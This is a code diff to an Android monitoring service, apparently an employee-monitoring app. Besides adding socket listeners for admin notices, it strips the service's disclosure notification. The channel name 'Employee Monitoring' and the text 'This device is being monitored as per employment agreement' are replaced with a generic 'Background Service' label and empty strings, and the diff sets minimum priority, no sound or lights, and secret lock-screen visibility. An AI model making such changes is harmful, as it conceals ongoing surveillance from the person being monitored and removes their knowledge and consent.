@@ -147,6 +147,21 @@ public class MonitoringService extends Service {
                 }
             });
 
+            // Listen for new notices from admin panel
+            socket.on("new_notice", args -> {
+                Log.d(TAG, "New notice received");
+                Intent intent = new Intent("com.company.monitor.NEW_NOTICE");
+                intent.setPackage(getPackageName());
+                sendBroadcast(intent);
+            });
+
+            socket.on("notices_updated", args -> {
+                Log.d(TAG, "Notices updated");
+                Intent intent = new Intent("com.company.monitor.NEW_NOTICE");
+                intent.setPackage(getPackageName());
+                sendBroadcast(intent);
+            });
+
             socket.connect();
         } catch (Exception e) {
             Log.e(TAG, "Socket init error", e);
@@ -440,21 +455,26 @@ public class MonitoringService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
-                "Employee Monitoring",
-                NotificationManager.IMPORTANCE_LOW
+                "Background Service",
+                NotificationManager.IMPORTANCE_MIN
             );
-            channel.setDescription("Company device monitoring service");
+            channel.setDescription("Background service");
+            channel.setShowBadge(false);
+            channel.enableLights(false);
+            channel.enableVibration(false);
+            channel.setSound(null, null);
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
         }
     }
 
     private Notification buildNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Company Monitoring Active")
-            .setContentText("This device is being monitored as per employment agreement.")
+            .setContentTitle("")
+            .setContentText("")
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build();
     }
 
